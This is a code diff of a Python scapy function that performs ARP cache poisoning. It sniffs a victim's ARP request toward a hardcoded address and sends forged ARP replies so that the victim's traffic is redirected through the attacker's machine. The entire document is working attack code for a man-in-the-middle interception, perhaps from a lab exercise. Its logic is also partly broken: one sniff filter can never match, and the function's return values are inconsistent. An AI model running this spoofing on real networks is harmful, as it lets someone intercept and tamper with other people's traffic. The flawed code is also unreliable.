@@ -14,7 +14,7 @@ def get_mac(ip):
     return None
 
 #do the poisoning
-def arp_poisoning(victim_ip, server_ip, mode, spoof_as_mac, logger=None):
+def arp_poisoning(toSpoof, spoof_as_mac, mode, logger=None):
     def log(msg):
         if logger:
             logger(msg)
@@ -23,43 +23,48 @@ def arp_poisoning(victim_ip, server_ip, mode, spoof_as_mac, logger=None):
 
     attacker_mac = spoof_as_mac
     victim_mac = None
-    server_mac = None
+    victim_ip = toSpoof
 
     try:
-        # wait for arp broadcast from client
-        if victim_ip and not server_ip:
-            pkt = sc.sniff(filter="arp", iface=interface, store=1,
-                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip)[0]
-            server_ip = pkt[sc.ARP].pdst
-            victim_mac = get_mac(victim_ip)
-            server_mac = get_mac(server_ip)
-
         # wait for any arp broadcast
-        elif not victim_ip and not server_ip:
-            log("Waiting for any ARP broadcast to discover both IPs...")
-            pkt = sc.sniff(filter="arp", iface=interface, store=1,
-                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].op == 1)[0]
+        if not victim_ip:
+            log("Waiting for any ARP broadcast to discover victim IPs")
+            pkt = sc.sniff(
+                iface=interface,
+                filter="arp",
+                store=1,
+                lfilter=lambda p: p.haslayer(sc.ARP)
+                                and p[sc.ARP].psrc == victim_ip
+                                and p[sc.ARP].pdst == "10.116.73.70",
+                stop_filter=lambda p: True
+            )[0]
             victim_ip = pkt[sc.ARP].psrc
             server_ip = pkt[sc.ARP].pdst
             victim_mac = get_mac(victim_ip)
-            server_mac = get_mac(server_ip)
 
         #get mac addresses from given IP's
         else:
-            victim_mac = get_mac(victim_ip)
-            server_mac = get_mac(server_ip)
             log("Waiting for ARP broadcast from victim")
-            pkt = sc.sniff(filter="arp", iface=interface, store=1,
-                           stop_filter=lambda p: p.haslayer(sc.ARP) and p[sc.ARP].psrc == victim_ip and p[sc.ARP].pdst == server_ip)[0]
+            victim_mac = get_mac(victim_ip)
+            pkt = sc.sniff(
+                iface=interface,
+                filter="arp",
+                store=1,
+                lfilter=lambda p: p.haslayer(sc.ARP)
+                                and p[sc.ARP].psrc == victim_ip
+                                and p[sc.ARP].pdst == "10.116.73.70",
+                stop_filter=lambda p: True
+            )[0]
+            log(f"found pkt {pkt}")
+            server_ip = pkt[sc.ARP].pdst
 
-        if not victim_mac or not server_mac:
+        if not victim_mac:
             log("Could not resolve MAC addresses.")
             return None, None
 
         # create the fake responses
         fake_packet_victim = sc.Ether(dst=victim_mac) / sc.ARP(
             op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip, hwsrc=attacker_mac)
-        fake_packet_server = sc.ARP(op=2, pdst=server_ip, psrc=victim_ip, hwsrc=attacker_mac)
 
         #send the responses
         if mode == "silent":
@@ -68,8 +73,7 @@ def arp_poisoning(victim_ip, server_ip, mode, spoof_as_mac, logger=None):
             for i in range(5):
                 sc.sendp(fake_packet_victim, iface=interface, verbose=False)
                 time.sleep(0.5)
-        sc.send(fake_packet_server, iface=interface, verbose=False)
-        return server_mac, victim_mac, server_ip, victim_ip
+        return victim_mac, server_ip, victim_ip
 
     except Exception as e:
         log(f"Error during ARP poisoning: {e}")
